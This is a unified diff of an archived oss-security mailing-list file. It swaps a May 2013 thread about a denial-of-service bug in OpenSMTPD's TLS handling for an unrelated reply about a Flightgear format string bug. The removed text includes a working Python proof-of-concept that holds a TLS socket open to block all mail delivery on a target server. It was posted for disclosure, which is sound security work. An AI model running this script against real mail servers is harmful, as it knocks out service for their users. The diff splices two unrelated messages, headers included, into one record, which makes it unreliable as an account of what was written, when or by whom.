@@ -1,72 +1,22 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/05/18/9
-Message-ID: <20130518161643.GA12530@poolp.org>
-Date: Sat, 18 May 2013 18:16:43 +0200
-From: Gilles Chehade <gilles@...lp.org>
-To: "Jason A. Donenfeld" <Jason@...c4.com>
-Cc: oss-security <oss-security@...ts.openwall.com>, misc@...nsmtpd.org
-Subject: Re: CVE Request: DoS in OpenSMTPD TLS Support
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/05/02/10
+Message-ID: <CAGVYHsUKfxHs34-hOJzmcqbKPNuAF=QkUMP4ggz69JDFyjAMJg@mail.gmail.com>
+Date: Thu, 2 May 2013 10:12:33 -0500
+From: Andrés Gómez Ramírez <andresgomezram7@...il.com>
+To: kseifried@...hat.com
+Cc: oss-security@...ts.openwall.com
+Subject: Re: Flightgear remote format string
 Content-Type: text/plain; charset=utf-8
 
-Erf...
+>
+> So it's not on by default? Is there any documentation specifically you
+> can point me to regarding enabling/securing it?
+>
 
-Not too nice to send a CVE request without ANY coordination with us ...
+Hi,
+the detailed info is in the reference:
 
-Just for the record, you contacted us today reporting a bug which could
-be memory corruption and you didn't know if it could be exploited. Then
-I replied telling you that we discovered and fixed the bug two days ago
-and I then explained to you what the bug really was (wrong logic in the
-IO events handling code in our SSL layer). I then told you that we made
-snapshots with the fix applied AND that we has planned for a release on
-*Monday* with the fixes backported.
+http://kuronosec.blogspot.com/2013/04/flightgear-remote-format-string.html
 
-The snapshot mail, commit log and diffs makes the issue obvious, I just
-don't understand why you had to go and publish *RIGHT AWAY* a script on
-public lists after our mail exchange...
+if you need more info, please let me know.
 
-I'm not mad that you disclosed a bug, we're very open about it, and the
-git history is full of references to crash and security fixes, but it's
-just REALLY not nice how you handled this and are forcing me to do this
-release in a hurry rather than handling it with package maintainers.
-
-Next time, please coordinate a little, just to be nice.
-
-
-On Sat, May 18, 2013 at 04:27:22PM +0200, Jason A. Donenfeld wrote:
-> Hi Kurt,
-> 
-> The SSL handling in the latest OpenSMTPD (5.3.1) misconfigures its
-> sockets in blocking mode, allowing an attacker to prevent all mail
-> delivery simply by holding a socket open.
-> 
-> I discovered this accidentally, as I noticed my HP printer's smtp
-> client would keep the connection indefinitely open after an
-> unsuccessful authentication attempt, causing no more mail to be
-> delivered until I SIGKILL'd my smtpd process or unplugged my printer.
-> 
-> The following reproduces the attack trivially:
-> 
->     #!/usr/bin/env python2
->     import smtplib
->     import time
->     print "[+] Connecting to server and initiating TLS"
->     smtp = smtplib.SMTP("mail.some-vitim-host.blah", 587)
->     smtp.starttls()
->     print "[+] No clients will be able to connect as long as this remains open."
->     time.sleep(100000000)
-> 
-> Apparently this was fixed recently upstream, noting "evil client" in
-> the commit message:
-> http://git.zx2c4.com/OpenSMTPD/commit/?id=38b26921bad5fe24ad747bf9d591330d683728b0
-> 
-> A snapshot has been posted to http://www.opensmtpd.org/archives/ , but
-> no patch release has yet been made.
-> 
-> Jason
-> 
-
-
--- 
-Gilles Chehade
-
-https://www.poolp.org                                          @poolpOrg
